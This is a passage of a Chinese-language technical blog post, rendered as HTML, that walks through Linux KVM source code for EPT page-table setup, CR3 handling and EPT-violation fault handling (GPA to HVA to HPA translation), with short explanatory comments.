class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vcpu-&gt;arch.mmu.shadow_root_level &gt;= PT64_ROOT_4LEVEL) &#123;</span><br><span class=\"line\">\t\tspin_lock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(make_mmu_pages_available(vcpu) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -ENOSPC;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsp = kvm_mmu_get_page(vcpu, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t\t\tvcpu-&gt;arch.mmu.shadow_root_level, <span class=\"number\">1</span>, ACC_ALL);</span><br><span class=\"line\">\t\t++sp-&gt;root_count;</span><br><span class=\"line\">\t\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\tvcpu-&gt;arch.mmu.root_hpa = __pa(sp-&gt;spt);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_get_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"type\">gfn_t</span> gfn,<span class=\"type\">gva_t</span> gaddr,<span class=\"type\">unsigned</span> level,<span class=\"type\">int</span> direct, <span class=\"type\">unsigned</span> access)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">kvm_mmu_page_role</span> <span class=\"title\">role</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> quadrant;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> need_sync = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> flush = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> collisions = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tLIST_HEAD(invalid_list);</span><br><span class=\"line\"></span><br><span class=\"line\">\trole = vcpu-&gt;arch.mmu.base_role;</span><br><span class=\"line\">\trole.level = level;</span><br><span class=\"line\">\trole.direct = direct;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (role.direct)</span><br><span class=\"line\">\t\trole.cr4_pae = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trole.access = access;</span><br><span class=\"line\">\tfor_each_valid_sp(vcpu-&gt;kvm, sp, gfn) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp-&gt;gfn != gfn) &#123;</span><br><span class=\"line\">\t\t\tcollisions++;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!need_sync &amp;&amp; sp-&gt;unsync)</span><br><span class=\"line\">\t\t\tneed_sync = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp-&gt;role.word != role.word)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t++vcpu-&gt;kvm-&gt;stat.mmu_cache_miss;</span><br><span class=\"line\">\tsp = kvm_mmu_alloc_page(vcpu, direct);</span><br><span class=\"line\">\tsp-&gt;gfn = gfn;</span><br><span class=\"line\">\tsp-&gt;role = role;</span><br><span class=\"line\">\thlist_add_head(&amp;sp-&gt;hash_link,</span><br><span class=\"line\">\t\t&amp;vcpu-&gt;kvm-&gt;arch.mmu_page_hash[kvm_page_table_hashfn(gfn)]);</span><br><span class=\"line\">\tsp-&gt;mmu_valid_gen = vcpu-&gt;kvm-&gt;arch.mmu_valid_gen;</span><br><span class=\"line\">\tclear_page(sp-&gt;spt);</span><br><span class=\"line\">\tkvm_mmu_flush_or_zap(vcpu, &amp;invalid_list, <span class=\"literal\">false</span>, flush);</span><br><span class=\"line\">out:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_alloc_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">int</span> direct)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsp = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_header_cache);</span><br><span class=\"line\">\tsp-&gt;spt = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_cache);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!direct)</span><br><span class=\"line\">\t\tsp-&gt;gfns = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_cache);</span><br><span class=\"line\">\tset_page_private(virt_to_page(sp-&gt;spt), (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)sp);</span><br><span class=\"line\">\tlist_add(&amp;sp-&gt;link, &amp;vcpu-&gt;kvm-&gt;arch.active_mmu_pages);</span><br><span class=\"line\">\tkvm_mod_used_mmu_pages(vcpu-&gt;kvm, +<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>kvm_mmu_get_page</code>是后续缺页异常添加页表页也会复用到的函数，作用就是返回(不存在时分配)page这个数据结构，不涉及页表页间的连接（配置页表项）</p>\n<p><code>kvm_mmu_page</code> 用hash table维护，这样可以直接找到某个地址对应的页表页，不需要遍历4级页表。</p>\n<p>这里root给的gfn是0，即GPA是0。初始化只有第一级页表页且不存在任何页表项。</p>\n<p>这里虽然每次run都会get_page，但是只有第一次会真的alloc，其他时候都会直接返回第一级页表页。</p>\n<p>在第一次run时，kvm不会先根据memslot创建好所有的映射，而是等guest真的访问了再在ept violation中加入对应的页表项。（刚运行时，VM的代码段需要被读取并执行，触发大量ept violation；写内存操作又会触发ept violation）</p>\n<p><code>kvm_mmu_flush_or_zap</code>会在一定条件下flush tlb，但是这里的条件都被给了false(linux6.4版本在这里没有flush tlb)</p>\n<h5 id=\"页表页的获取\"><a href=\"#页表页的获取\" class=\"headerlink\" title=\"页表页的获取\"></a>页表页的获取</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> *<span class=\"title function_\">mmu_memory_cache_alloc</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_mmu_memory_cache *mc)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *p;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBUG_ON(!mc-&gt;nobjs);</span><br><span class=\"line\">\tp = mc-&gt;objects[--mc-&gt;nobjs];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">mmu_topup_memory_cache_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_mmu_memory_cache *cache,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t       <span class=\"type\">int</span> min)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *page;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (cache-&gt;nobjs &gt;= min)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (cache-&gt;nobjs &lt; ARRAY_SIZE(cache-&gt;objects)) &#123;</span><br><span class=\"line\">\t\tpage = (<span class=\"type\">void</span> *)__get_free_page(GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!page)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -ENOMEM;</span><br><span class=\"line\">\t\tcache-&gt;objects[cache-&gt;nobjs++] = page;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>拿page最后会调<code>mm/page_alloc.c</code>的<code>__alloc_pages_nodemask</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//include/linux/mm.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_address(page) lowmem_page_address(page)</span></span><br><span class=\"line\"><span class=\"type\">static</span> __always_inline <span class=\"type\">void</span> *<span class=\"title function_\">lowmem_page_address</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> page *page)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> page_to_virt(page);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_to_virt(x)\t__va(PFN_PHYS(page_to_pfn(x)))</span></span><br><span class=\"line\"><span class=\"comment\">//arch/x86/include/asm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __pa(x)\t\t__phys_addr((unsigned long)(x))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __va(x)\t\t\t((void *)((unsigned long)(x)+PAGE_OFFSET))</span></span><br><span class=\"line\"><span class=\"comment\">//include/linux/pfn.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PFN_PHYS(x)\t((phys_addr_t)(x) &lt;&lt; PAGE_SHIFT)</span></span><br><span class=\"line\"><span class=\"comment\">//arch/x86/mm/physaddr.c</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">long</span> __phys_addr(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> y = x - __START_KERNEL_map;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(x &gt; y)) &#123;</span><br><span class=\"line\">\t\tx = y + phys_base;</span><br><span class=\"line\">\t\tVIRTUAL_BUG_ON(y &gt;= KERNEL_IMAGE_SIZE);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tx = y + (__START_KERNEL_map - PAGE_OFFSET);</span><br><span class=\"line\">\t\tVIRTUAL_BUG_ON((x &gt; y) || !phys_addr_valid(x));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>vcpu-&gt;arch.mmu.root_hpa = __pa(sp-&gt;spt);</code>可以看到EPT基地址用的是内核在内存模块拿到的页并转换为的物理地址，即HPA</p>\n<h4 id=\"CR3\"><a href=\"#CR3\" class=\"headerlink\" title=\"CR3\"></a>CR3</h4><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmx_set_cr3</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> cr3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> guest_cr3;</span><br><span class=\"line\">\tu64 eptp;</span><br><span class=\"line\">\tguest_cr3 = cr3;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (enable_ept) &#123;</span><br><span class=\"line\">\t\teptp = construct_eptp(vcpu, cr3);</span><br><span class=\"line\">\t\tvmcs_write64(EPT_POINTER, eptp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (is_paging(vcpu) || is_guest_mode(vcpu))</span><br><span class=\"line\">\t\t\tguest_cr3 = kvm_read_cr3(vcpu);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tguest_cr3 = vcpu-&gt;kvm-&gt;arch.ept_identity_map_addr;</span><br><span class=\"line\">\t\tept_load_pdptrs(vcpu);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvmx_flush_tlb(vcpu, <span class=\"literal\">true</span>);</span><br><span class=\"line\">\tvmcs_writel(GUEST_CR3, guest_cr3);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的<code>vmx_set_cr3</code>一方面把用户的cr3写到VMCS中，另一方面把自己构造的EPT也写到VMCS中</p>\n<p>操作系统都会先在不开MMU的情况下配置页表，然后打开MMU，这些都不会下陷到VMM（不使用cr3，只使用ept）</p>\n<p>每次进入non-root模式会把当前VMCS的cr3赋值给cr3，使用cr3和VMCS的EPT</p>\n<h2 id=\"EPT-VIOLATION\"><a href=\"#EPT-VIOLATION\" class=\"headerlink\" title=\"EPT VIOLATION\"></a>EPT VIOLATION</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vmx_handle_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exit_reason &lt; kvm_vmx_max_exit_handlers</span><br><span class=\"line\">\t    &amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GVA-GPA\"><a href=\"#GVA-GPA\" class=\"headerlink\" title=\"GVA-&gt;GPA\"></a>GVA-&gt;GPA</h3><p>Guest的GVA-&gt;GPA缺页异常由自己完成，<code>EPT_VIOLATION</code>只存在于存在GVA-&gt;GPA但不存在GPA-&gt;HPA的情况</p>\n<p>发生<code>EPT_VIOLATION</code>前 异常的GPA会被自动保存到当前VMCS的<code>GUEST_PHYSICAL_ADDRESS</code>字段</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_violation</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">gpa_t</span> gpa=vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> kvm_mmu_page_fault(vcpu, gpa, error_code, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa, u64 error_code,</span></span><br><span class=\"line\"><span class=\"params\">\t\t       <span class=\"type\">void</span> *insn, <span class=\"type\">int</span> insn_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = vcpu-&gt;arch.mmu.page_fault(vcpu, cr2_or_gpa,</span><br><span class=\"line\">\t\t\t\t\t       lower_32_bits(error_code),<span class=\"literal\">false</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r == RET_PF_RETRY)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">tdp_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, u32 error_code,<span class=\"type\">bool</span> prefault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"type\">int</span> level;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> force_pt_level;</span><br><span class=\"line\">\t<span class=\"type\">gfn_t</span> gfn = gpa &gt;&gt; PAGE_SHIFT;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> mmu_seq;</span><br><span class=\"line\">\t<span class=\"type\">int</span> write = error_code &amp; PFERR_WRITE_MASK;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> map_writable;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> lpage_disallowed = (error_code &amp; PFERR_FETCH_MASK) &amp;&amp;</span><br><span class=\"line\">\t\t\t\tis_nx_huge_page_enabled();</span><br><span class=\"line\"></span><br><span class=\"line\">\tMMU_WARN_ON(!VALID_PAGE(vcpu-&gt;arch.mmu.root_hpa));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (page_fault_handle_page_track(vcpu, error_code, gfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_EMULATE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = mmu_topup_memory_caches(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tforce_pt_level =</span><br><span class=\"line\">\t\tlpage_disallowed ||</span><br><span class=\"line\">\t\t!check_hugepage_cache_consistency(vcpu, gfn, PT_DIRECTORY_LEVEL);</span><br><span class=\"line\">\tlevel = mapping_level(vcpu, gfn, &amp;force_pt_level);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (likely(!force_pt_level)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (level &gt; PT_DIRECTORY_LEVEL &amp;&amp;</span><br><span class=\"line\">\t\t    !check_hugepage_cache_consistency(vcpu, gfn, level))</span><br><span class=\"line\">\t\t\tlevel = PT_DIRECTORY_LEVEL;</span><br><span class=\"line\">\t\tgfn &amp;= ~(KVM_PAGES_PER_HPAGE(level) - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fast_page_fault(vcpu, gpa, level, error_code))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmmu_seq = vcpu-&gt;kvm-&gt;mmu_notifier_seq;</span><br><span class=\"line\">\tsmp_rmb();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (try_async_pf(vcpu, prefault, gfn, gpa, &amp;pfn, write, &amp;map_writable))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (handle_abnormal_pfn(vcpu, <span class=\"number\">0</span>, gfn, pfn, ACC_ALL, &amp;r))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = RET_PF_RETRY;</span><br><span class=\"line\">\tspin_lock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mmu_notifier_retry(vcpu-&gt;kvm, mmu_seq))</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out_unlock;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (make_mmu_pages_available(vcpu) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out_unlock;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (likely(!force_pt_level))</span><br><span class=\"line\">\t\ttransparent_hugepage_adjust(vcpu, gfn, &amp;pfn, &amp;level);</span><br><span class=\"line\">\tr = __direct_map(vcpu, gpa, write, map_writable, level, pfn,</span><br><span class=\"line\">\t\t\t prefault, lpage_disallowed);</span><br><span class=\"line\">out_unlock:</span><br><span class=\"line\">\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\tkvm_release_pfn_clean(pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GPA-HVA\"><a href=\"#GPA-HVA\" class=\"headerlink\" title=\"GPA-&gt;HVA\"></a>GPA-&gt;HVA</h3><p>先根据memslot做GPA-&gt;HVA</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">try_async_pf</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">bool</span> prefault, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">gpa_t</span> cr2_or_gpa, <span class=\"type\">kvm_pfn_t</span> *pfn, <span class=\"type\">bool</span> write,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> async;</span><br><span class=\"line\"></span><br><span class=\"line\">\tslot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class=\"line\">\tasync = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, &amp;async, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!async)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>; <span class=\"comment\">/* *pfn has correct page already */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!prefault &amp;&amp; kvm_can_do_async_pf(vcpu)) &#123;</span><br><span class=\"line\">\t\ttrace_kvm_try_async_get_page(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_find_async_pf_gfn(vcpu, gfn)) &#123;</span><br><span class=\"line\">\t\t\ttrace_kvm_async_pf_doublefault(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t\tkvm_make_request(KVM_REQ_APF_HALT, vcpu);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (kvm_arch_setup_async_pf(vcpu, cr2_or_gpa, gfn))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, <span class=\"literal\">NULL</span>, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里pfn并没有检查返回值，如果是错误情况会在后面用到的时候进行处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">kvm_pfn_t</span> __gfn_to_pfn_memslot(<span class=\"keyword\">struct</span> kvm_memory_slot *slot, <span class=\"type\">gfn_t</span> gfn,</span><br><span class=\"line\">\t\t\t       <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async, <span class=\"type\">bool</span> write_fault,</span><br><span class=\"line\">\t\t\t       <span class=\"type\">bool</span> *writable)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr = __gfn_to_hva_many(slot, gfn, <span class=\"literal\">NULL</span>, write_fault);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (addr == KVM_HVA_ERR_RO_BAD) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> KVM_PFN_ERR_RO_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_is_error_hva(addr)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (writable)</span><br><span class=\"line\">\t\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> KVM_PFN_NOSLOT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (writable &amp;&amp; memslot_is_readonly(slot)) &#123;</span><br><span class=\"line\">\t\t*writable = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\twritable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> hva_to_pfn(addr, atomic, async, write_fault,</span><br><span class=\"line\">\t\t\t  writable);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>__gfn_to_hva_many</code>-&gt;<code>__gfn_to_hva_memslot</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span></span><br><span class=\"line\">__gfn_to_hva_memslot(<span class=\"keyword\">struct</span> kvm_memory_slot *slot, <span class=\"type\">gfn_t</span> gfn)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> offset = gfn - slot-&gt;base_gfn;</span><br><span class=\"line\">\toffset = array_index_nospec(offset, slot-&gt;npages);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> slot-&gt;userspace_addr + offset * PAGE_SIZE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里返回的hva是guest发生page fault的GPA对应的HVA</p>\n<p><code>KVM_PFN_NOSLOT</code>会在<code>set_spte</code>中通过<code>is_noslot_pfn</code> <code>mark_mmio_spte</code>特殊处理 下一次访问会触发EPT misconfig</p>\n<h3 id=\"HVA-HPA\"><a href=\"#HVA-HPA\" class=\"headerlink\" title=\"HVA-&gt;HPA\"></a>HVA-&gt;HPA</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">kvm_pfn_t</span> <span class=\"title function_\">hva_to_pfn</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> addr, <span class=\"type\">bool</span> atomic, <span class=\"type\">bool</span> *async,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"type\">bool</span> write_fault, <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vm_area_struct</span> *<span class=\"title\">vma</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">kvm_pfn_t</span> pfn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> npages, r;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hva_to_pfn_fast(addr, atomic, async, write_fault, writable, &amp;pfn))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tnpages = hva_to_pfn_slow(addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">\tdown_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == -EHWPOISON ||</span><br><span class=\"line\">\t      (!async &amp;&amp; check_user_page_hwpoison(addr))) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_HWPOISON;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> <span class=\"built_in\">exit</span>;</span><br><span 